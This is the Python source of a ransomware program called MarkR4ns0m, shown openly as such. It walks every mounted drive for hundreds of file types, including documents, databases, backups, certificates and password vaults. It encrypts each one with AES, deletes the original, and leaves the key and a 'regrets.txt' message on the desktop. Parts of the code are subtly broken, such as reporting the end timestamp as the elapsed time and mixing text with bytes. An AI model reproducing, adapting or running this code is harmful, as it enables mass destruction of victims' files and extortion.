#!/usr/bin/env python
# -*- coding: utf-8 -*-
# MarkR4ns0m (https://www.github.com/R3nt0n/markransom)
# R3nt0n (https://www.github.com/R3nt0n)

import os
from time import time
from base64 import b64encode

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes  # Para generar la clave


def findRootPaths():
    '''Returns a list with all the partitions/mount points which are currently
       mounted on the system.'''
    if os.name == 'nt':
        unitLetters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
        unitsMounted = []
        for letter in unitLetters:
            mountpoint = os.path.normpath(letter + ':/')
            if os.path.exists(mountpoint):
                unitsMounted.append(mountpoint)
        rootPaths = unitsMounted
    else:
        rootPaths = ['/']

    return rootPaths


def findScriptMountPoint():
    '''Returns the mount point where the script is located.'''
    scriptPath = os.path.abspath(__file__)
    scriptDir = os.path.dirname(scriptPath)
    os.chdir(scriptDir)

    while True:
        os.chdir('..')
        actualPath = os.path.normpath(os.getcwd())
        if os.path.ismount(actualPath):
            scriptMountPoint = actualPath
            break

    return scriptMountPoint


def findFiles(unitsMounted, extensions, scriptMountPoint):
    '''Walk all units mounted in looking for files that matches one of the
       extensions. The mount point where the script is located can be excluded.

       Returns a list of files, including the absolute path of each one.

       Arguments:
       unitsMounted -- list of units that will be walked.
       extensions -- list of extensions that will be searched.
       scriptMountPoint -- string with a mount point that will be excluded.
    '''
    fileList = []

    for unit in unitsMounted:
        rootPath = unit

        for root, dirs, files in os.walk(rootPath, topdown=False):
            for name in files:
                for extension in extensions:
                    if name.endswith(extension) \
                       and not name.startswith(scriptMountPoint):

                        fileMatch = os.path.join(root, name)
                        fileList.append(fileMatch)

    return fileList


def cipher(data, key):
    '''Encrypt data with AES(CBC mode).

       Returns an string encoded in base64 containing the encrypted data.

       Arguments:
       data -- the data that will be encrypted.
       key -- the key for the encryption. For AES256, it has to be 32 bytes.
    '''
    data = b64encode(data)
    cipher = AES.new(key, AES.MODE_CBC)
    padData = pad(data, cipher.block_size)
    cipherText = cipher.encrypt(padData)  # Aquí tengo el mensaje cifrado
    cipherData = cipher.iv + ':%:%:&:%:%:' + cipherText
    return cipherData


################################################################################
# SCRIPT-WORKFLOW
################################################################################
if __name__ == '__main__':

    initTime = time()

    rootPaths = findRootPaths()
    scriptMountPoint = findScriptMountPoint()
    #extensions = ['.pdf', '.doc', '.docx', '.txt', '.png', '.jpg']
    extensions = ['.wb2', '.psd', '.p7c', '.p7b', '.p12', '.pfx', '.pem', '.crt','.cer', '.der', '.pl', '.py', '.lua',
                  '.css', '.js', '.asp', '.php', '.incpas', '.asm', '.hpp', '.h', '.cpp', '.c', '.7z', '.zip', '.rar',
                  '.drf', '.blend', '.apj', '.3ds', '.dwg', '.sda', '.ps', '.pat', '.fxg', '.fhd', '.fh', '.dxb',
                  '.drw', '.design', '.ddrw', '.ddoc', '.dcs', '.csl', '.csh', '.cpi', '.cgm', '.cdx', '.cdrw', '.cdr6',
                  '.cdr5', '.cdr4', '.cdr3', '.cdr', '.awg', '.ait', '.ai', '.agd1', '.ycbcra', '.x3f', '.stx', '.st8',
                  '.st7', '.st6', '.st5', '.st4', '.srw', '.srf', '.sr2', '.sd1', '.sd0', '.rwz', '.rwl', '.rw2', '.raw',
                  '.raf', '.ra2', '.ptx', '.pef', '.pcd', '.orf', '.nwb', '.nrw', '.nop', '.nef', '.ndd', '.mrw', '.mos',
                  '.mfw', '.mef', '.mdc', '.kdc', '.kc2', '.iiq', '.gry', '.grey', '.gray', '.fpx', '.fff', '.exf', '.erf',
                  '.dng', '.dcr', '.dc2', '.crw', '.craw', '.cr2', '.cmt', '.cib', '.ce2', '.ce1', '.arw', '.3pr', '.3fr',
                  '.mpg', '.jpeg', '.jpg', '.mdb', '.sqlitedb', '.sqlite3', '.sqlite', '.sql', '.sdf', '.sav', '.sas7bdat',
                  '.s3db', '.rdb', '.psafe3', '.nyf', '.nx2', '.nx1', '.nsh', '.nsg', '.nsf', '.nsd', '.ns4', '.ns3', '.ns2',
                  '.myd', '.kpdx', '.kdbx', '.idx', '.ibz', '.ibd', '.fdb', '.erbsql', '.db3', '.dbf', '.db-journal', '.db',
                  '.cls', '.bdb', '.al', '.adb', '.backupdb', '.bik', '.backup', '.bak', '.bkp', '.moneywell', '.mmw',
                  '.ibank', '.hbk', '.ffd', '.dgc', '.ddd', '.dac', '.cfp', '.cdf', '.bpw', '.bgt', '.acr', '.ac2', '.ab4',
                  '.djvu', '.pdf', '.sxm', '.odf', '.std', '.sxd', '.otg', '.sti', '.sxi', '.otp', '.odg', '.odp', '.stc',
                  '.sxc', '.ots', '.ods', '.sxg', '.stw', '.sxw', '.odm', '.oth', '.ott', '.odt', '.odb', '.csv', '.rtf',
                  '.accdr', '.accdt', '.accde', '.accdb', '.sldm', '.sldx', '.ppsm', '.ppsx', '.ppam', '.potm', '.potx',
                  '.pptm', '.pptx', '.pps', '.pot', '.ppt', '.xlw', '.xll', '.xlam', '.xla', '.xlsb', '.xltm', '.xltx',
                  '.xlsm', '.xlsx', '.xlm', '.xlt', '.xls', '.xml', '.dotm', '.dotx', '.docm', '.docx', '.dot', '.doc', '.txt']
    fileList = findFiles(rootPaths, extensions, scriptMountPoint)
    key = get_random_bytes(32)  # Generating a random key

    # Encrypting the files
    for filePath in fileList:
        try:
            with open(filePath, 'rb') as filePlain:
                data = filePlain.read()
            cipherData = cipher(data, key)
            with open(filePath + '.mrcrypt', 'wb+') as fileCrypted:
                fileCrypted.write(cipherData)
            os.remove(filePath)
        except:
            pass

    # Calculating encryption time, writing the final message and saving the key.
    endTime = time()
    executionTime = endTime - initTime

    keyEnc = b64encode(key)
    msg = (str(len(fileList)) + ' files have been encrypted  in ' +
           str(endTime) + ' seconds. The key-file is on your desktop.')

    keyFile = os.path.expanduser('~/Desktop/key')
    with open(keyFile, 'wb+') as fKey:
        fKey.write(keyEnc)
    msgFile = os.path.expanduser('~/Desktop/regrets.txt')
    with open(msgFile, 'wb+') as fMsg:
        fMsg.write(msg)
